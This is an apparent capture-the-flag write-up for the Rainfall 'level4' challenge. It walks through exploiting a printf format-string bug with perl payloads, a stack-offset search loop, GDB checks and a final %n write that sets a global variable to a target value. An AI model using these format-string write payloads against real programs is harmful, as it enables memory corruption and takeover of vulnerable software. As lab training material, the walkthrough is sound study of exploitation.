# level4

Pull the executable:

```sh
sshpass -f ../level3/flag scp level4@rainfall:level4 .
```

See `source.c` for source reconstitution.

This exercise is similar to the previous one, except `m` now needs to be `16_930_116` (`0x1025544`), and the `printf(3)` call is nested in another function call.

Before thinking too much about it, let's try the same approach as level3.  Address of `m` is `0x08049810`, so let's put that in our payload:

```sh
perl -e 'print pack("L<", 0x08049810), "%p %p %p %p %p\n"' | ./level4
# -> 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil)
```

Nope.  What about more?

```sh
perl -e 'print pack("L<", 0x08049810), "%p %p %p %p %p %p %p\n"' | ./level4
# -> 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d
```

Still no luck.  But `0xbffff748` and `0x804848d` awfully look like what we saw in level2.  Maybe instead of overwriting `m` we could override the return address of `p`?

```sh
perl -e 'print "%7\$n\n"' | ./level4
```

We get a segmentation fault, and that's normal because we try to write at the return address, not at the address where it is saved in the stack frame.  What we did was basically equivalent to:

```c
*(unsigned int *)0x804848d = 0;
```

It cannot work because `0x804848d` is located in section `.text`, which is read-only.

There doesn't seem to exist a way to get the address of the buffer that `"%n"` writes to, so let's move along.

This still looks like a call stack after all, so maybe we should try to go further.  Let's make a tiny helper script that will test the possibilities for us:

```sh
for i in $(seq 64); do
    s="$(echo "BBBB %$i\$p" | ~/level4)"
    
    if [ "$s" = "BBBB 0x42424242" ]; then
        echo "%$i\$p"
        break
    fi
done
```

It prints `"%12$p"`, so let's put that in a payload:

```sh
perl -e 'print pack("L<", 0x08049810), "%12\$n", "\n"' > /tmp/4
```

We wrote 4 bytes (the address of `m`) before `"%n"`, so let's check that the value of `m` is 4 in GDB:

```sh
gdb ./level4
watch m
r </tmp/4
```

We get:

```
Old value = 0
New value = 4
0xb7e71e2f in vfprintf () from /lib/i386-linux-gnu/libc.so.6
```

It works, so now we need to somehow write 16930116 bytes using printf.  This may seem intimidating, but it's actually really easy.  Instead of putting millions of bytes into our format string (which wouldn't work because the programs reads at most 512 bytes from stdin), we can use the `printf(3)` padding modifier.  We know that the 4th value on the stack printf `(nil)`, that means it has value 0 therefore the output should be very predictable.

```sh
perl -e 'print pack("L<", 0x08049810), "%4\$16930112u", "%12\$n", "\n"' | ./level4
```

The output will take some time to be consumed, especially if stdout is a terminal over an SSH connection, but in the end we get the flag directly.
